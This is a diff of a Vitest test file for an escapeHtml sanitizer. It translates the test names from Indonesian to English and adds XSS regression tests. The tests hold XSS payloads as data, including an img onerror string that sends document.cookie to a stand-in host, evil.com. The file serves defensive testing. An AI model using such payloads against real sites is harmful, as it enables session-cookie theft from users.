@@ -2,59 +2,67 @@ import { describe, expect, it } from 'vitest'
 
 import { escapeHtml } from '../sanitize'
 
-describe('sanitize', () => {
-  describe('escapeHtml', () => {
-    it('harus escape ampersand (&)', () => {
-      expect(escapeHtml('A & B')).toBe('A &amp; B')
-    })
+describe('escapeHtml', () => {
+  it('escapes ampersand', () => {
+    expect(escapeHtml('Tom & Jerry')).toBe('Tom &amp; Jerry')
+  })
 
-    it('harus escape less-than (<)', () => {
-      expect(escapeHtml('<script>')).toBe('&lt;script&gt;')
-    })
+  it('escapes less-than sign', () => {
+    expect(escapeHtml('<script>')).toBe('&lt;script&gt;')
+  })
 
-    it('harus escape greater-than (>)', () => {
-      expect(escapeHtml('tag >')).toBe('tag &gt;')
-    })
+  it('escapes greater-than sign', () => {
+    expect(escapeHtml('a > b')).toBe('a &gt; b')
+  })
 
-    it('harus escape double-quote (")', () => {
-      expect(escapeHtml('nilai="test"')).toBe('nilai=&quot;test&quot;')
-    })
+  it('escapes double quotes', () => {
+    expect(escapeHtml('say "hello"')).toBe('say &quot;hello&quot;')
+  })
 
-    it('harus escape single-quote (\')', () => {
-      expect(escapeHtml("onclick='alert()")).toBe('onclick=&#039;alert()')
-    })
+  it('escapes single quotes', () => {
+    expect(escapeHtml("it's")).toBe('it&#039;s')
+  })
 
-    it('harus escape multiple special characters', () => {
-      expect(escapeHtml('<img src="x" onerror="alert()">')).toBe(
-        '&lt;img src=&quot;x&quot; onerror=&quot;alert()&quot;&gt;'
-      )
-    })
+  it('blocks XSS img onerror payload', () => {
+    const payload = '<img src=x onerror=alert(document.cookie)>'
+    const escaped = escapeHtml(payload)
+    // Tag brackets are escaped so it cannot be parsed as HTML
+    expect(escaped).not.toContain('<img')
+    expect(escaped).not.toContain('>')
+    expect(escaped).toContain('&lt;img')
+    expect(escaped).toContain('&gt;')
+  })
 
-    it('harus mengembalikan string kosong jika input kosong', () => {
-      expect(escapeHtml('')).toBe('')
-    })
+  it('blocks XSS script tag', () => {
+    const payload = '<script>alert("xss")</script>'
+    const escaped = escapeHtml(payload)
+    expect(escaped).not.toContain('<script>')
+    expect(escaped).toContain('&lt;script&gt;')
+  })
 
-    it('harus mengembalikan string normal tanpa perubahan jika tidak ada karakter spesial', () => {
-      expect(escapeHtml('Teks biasa tanpa HTML')).toBe('Teks biasa tanpa HTML')
-    })
+  it('returns empty string unchanged', () => {
+    expect(escapeHtml('')).toBe('')
+  })
 
-    it('harus escape semua kombinasi XSS payload', () => {
-      const payload = '"><script>alert("XSS")</script>'
-      expect(escapeHtml(payload)).toBe(
-        '&quot;&gt;&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;'
-      )
-    })
+  it('returns plain text unchanged', () => {
+    expect(escapeHtml('Hello World')).toBe('Hello World')
+  })
 
-    it('harus handle multiple ampersand dalam string', () => {
-      expect(escapeHtml('A & B & C')).toBe('A &amp; B &amp; C')
-    })
+  it('handles all special characters together', () => {
+    const input = '& < > " \''
+    const result = escapeHtml(input)
+    expect(result).toBe('&amp; &lt; &gt; &quot; &#039;')
+  })
 
-    it('harus preserve nomor dan huruf normal', () => {
-      expect(escapeHtml('Hello123 World')).toBe('Hello123 World')
-    })
-
-    it('harus escape HTML entities dalam atribut nilai', () => {
-      expect(escapeHtml('data-value="<test>"')).toBe('data-value=&quot;&lt;test&gt;&quot;')
-    })
+  it('CERTIFICATE XSS: escapes malicious profile name', () => {
+    const maliciousName =
+      '<img src=x onerror=window.location="http://evil.com?cookie="+document.cookie>'
+    const escaped = escapeHtml(maliciousName)
+    // When injected into document.write, must not execute as HTML:
+    // tag brackets are escaped, quotes are escaped — browser cannot parse it as a tag
+    expect(escaped).not.toMatch(/<img/)
+    expect(escaped).toContain('&lt;img')
+    expect(escaped).toContain('&quot;')
+    expect(escaped).toContain('&gt;')
   })
 })
